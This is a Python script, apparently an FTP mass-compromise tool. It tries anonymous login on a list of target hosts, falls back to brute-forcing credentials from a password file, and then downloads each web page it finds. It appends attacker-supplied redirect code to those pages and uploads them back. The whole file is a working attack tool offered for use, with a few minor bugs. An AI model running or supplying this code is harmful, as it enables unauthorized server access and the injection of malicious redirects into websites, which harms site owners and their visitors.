import ftplib
import optparse
import time

def anonLogin(host):
    try:
        ftp=ftplib.FTP(host)
        ftp.login('anonymous','me@your.com')
        print('[*] '+str(host)+' FTP anonymous login successed')
        ftp.quit()
        return True
    except Exception as e:
        print('[-] '+str(host)+' FTP anonymous login failed')
        return False

def bruteLogin(host,passwordFile):
    with open(passwordFile,'r') as f:
        for line in f.readlines():
            user,password=line.strip('\r\n').split(':')
            try:
                ftp=ftplib.FTP(host)
                ftp.login(user,password)
                print('[*] Login Successed! password (%s:%s)' % (user,password))
                return user,password
            except:
                print('[-] Error Password')
        print('[-] Fail ')
        return None,None

def returnDefault(ftp):
    try:
        dirList=ftp.nlst()
    except:
        dirList=[]
        print('No file!')
        return []
    retList=[]
    for filename in dirList:
        fn=filename.lower()
        if '.php' in fn or '.htm' in fn or '.html' in fn or '.asp' in fn :
            retList.append(filename)
    return retList

def injectPage(ftp,page,redirect):
    with open(page+'.tmp','w') as f :
        ftp.retrlines('RETR'+page,f.write)
        print('Download page:'+page)
        f.write(redirect)
    print('Injected on '+page)
    ftp.storlines('STOR'+page,open(page+'.tmp'))
    print('Uploaded Injected page:'+page)

def attrack(user,password,tgthost,redirect):
    ftp=ftplib.FTP(tgthost)
    ftp.login(user,password)
    defaultPages=returnDefault(ftp)
    for defaultPage in defaultPages:
        injectPage(ftp,defaultPage,redirect)

def main():
    parser=optparse.OptionParser('usage%prog '+'-H <target host> -r <redirect code> -f <passwordfile>')
    parser.add_option('-H',dest='tgthosts',type='string',help='specify target hosts')
    parser.add_option('-r',dest='redirect',type='string',help='specify redirect code')
    parser.add_option('-f',dest='passwordFile',type='string',help='specify passwordfile')
    (options,args)=parser.parse_args()
    if options.tgthosts==None:
        print(parser.usage)
        exit(0)
    tgthosts=options.tgthosts.split(',')
    redirect=options.redirect
    passwordFile=options.passwordFile
    if tgthosts==None or redirect==None or passwordFile==None:
        print(parser.usage)
        exit(0)
    for tgthost in tgthosts:
        if anonLogin(tgthost)==True:
            user='anonymous'
            password='me@your.com'
            print('Using anonymous to attrack:')
            attrack(user,password,tgthost,redirect)
        else:
            user,password=bruteLogin(tgthost,passwordFile)
            if password==None and user ==None:
                print('Error Password!')
            else:
                attrack(user,password,tgthost,redirect)

if __name__ == '__main__':
    main()






